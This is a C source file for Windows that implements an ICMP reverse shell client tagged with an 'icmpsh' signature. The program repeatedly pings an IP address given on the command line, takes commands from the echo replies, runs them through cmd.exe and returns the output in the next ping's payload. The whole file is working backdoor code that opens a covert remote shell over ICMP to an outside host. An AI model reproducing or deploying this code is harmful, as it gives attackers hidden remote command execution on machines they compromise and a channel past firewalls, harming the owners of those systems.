#include <iphlpapi.h>
#include <icmpapi.h>
#include <stdio.h>

#pragma comment(lib, "Iphlpapi.lib")
#pragma comment(lib, "Ws2_32.lib")

#define SIGNATURE_LEN 24
#define MAX_OUTPUT 8192

const unsigned char SIGNATURE[SIGNATURE_LEN] = {
    0,   0,   0,   0, 0, 0, 0, 0, 0, 'i', 'c', 'm',
    'p', 's', 'h', 0, 0, 0, 0, 0, 0, 0,   0,   0};

void run_command(const char *cmd, char *output, size_t out_size) {
    char fullcmd[512];
    snprintf(fullcmd, sizeof(fullcmd), "cmd.exe /C %s 2>&1", cmd);

    FILE *fp = _popen(fullcmd, "r");
    if (!fp) {
        snprintf(output, out_size, "failed to execute: %s", cmd);
        return;
    }

    size_t len = 0;
    output[0] = '\0';

    while (fgets(output + len, (int)(out_size - len - 1), fp)) {
        len = strlen(output);
        if (len >= out_size - 1)
            break;
    }
    _pclose(fp);

    if (len == 0)
        snprintf(output, out_size, "(no output)");
}

int main(int argc, char **argv) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <ip-address>\n", argv[0]);
        return 1;
    }

    const char *ip_str = argv[1];
    IPAddr ipaddr = inet_addr(ip_str);
    if (ipaddr == INADDR_NONE) {
        fprintf(stderr, "Invalid IP address: %s\n", ip_str);
        return 1;
    }

    HANDLE hIcmpFile = IcmpCreateFile();
    if (hIcmpFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "IcmpCreateFile failed: %lu\n", GetLastError());
        return 1;
    }

    DWORD replySize = sizeof(ICMP_ECHO_REPLY) + MAX_OUTPUT + SIGNATURE_LEN + 8;
    void *replyBuffer = malloc(replySize);
    if (!replyBuffer) {
        fprintf(stderr, "Failed to allocate reply buffer\n");
        IcmpCloseHandle(hIcmpFile);
        return 1;
    }

    char queued[MAX_OUTPUT] = {0};

    while (1) {
        size_t payload_len = SIGNATURE_LEN;
        unsigned char payload[SIGNATURE_LEN + MAX_OUTPUT];
        memcpy(payload, SIGNATURE, SIGNATURE_LEN);

        if (queued[0] != '\0') {
            size_t queued_len = strlen(queued);
            memcpy(payload + SIGNATURE_LEN, queued, queued_len);
            payload_len += queued_len;
            queued[0] = '\0';
        }

        DWORD ret =
            IcmpSendEcho(hIcmpFile, ipaddr, (LPVOID)payload, (WORD)payload_len,
                         NULL, replyBuffer, replySize, 3000);

        if (ret != 0) {
            PICMP_ECHO_REPLY echo = (PICMP_ECHO_REPLY)replyBuffer;

            if (echo->DataSize > SIGNATURE_LEN) {
                unsigned char *data = (unsigned char *)echo->Data;
                int cmd_len = echo->DataSize - SIGNATURE_LEN;
                char *cmd = malloc(cmd_len + 1);
                memcpy(cmd, data + SIGNATURE_LEN, cmd_len);
                cmd[cmd_len] = '\0';

                char result[MAX_OUTPUT];
                run_command(cmd, result, sizeof(result));

                strncpy(queued, result, sizeof(queued) - 1);
                free(cmd);
            }
        }

        Sleep(3000);
    }

    free(replyBuffer);
    IcmpCloseHandle(hIcmpFile);
    return 0;
}
